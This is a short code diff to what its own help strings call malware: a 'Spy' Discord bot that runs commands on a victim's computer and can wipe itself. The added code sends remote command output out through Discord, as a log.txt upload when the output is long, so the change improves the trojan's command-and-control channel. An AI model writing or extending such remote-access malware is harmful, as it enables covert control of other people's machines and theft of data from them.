@@ -59,7 +59,16 @@ class Spy:
 
     @Bot.command(help="Send command to computer")
     async def cmd(ctx, *, args) -> None:
-        await Spy.Debug('\n\n'.join(await Spy.RunCommand(args)).strip() or "No output")
+        content = '\n\n'.join(await Spy.RunCommand(args)).strip() or "No output"
+        
+        if len(content)>2000:
+            path = "log.txt"
+            with open(path, "w") as f:
+                f.write(content)
+            await Spy.Channel.send(file=nextcord.File(path))
+            os.remove(path)
+        else:
+            await Spy.Debug(content)
 
     @Bot.command(help="Halt and delete malware")
     async def wipe(ctx) -> None:
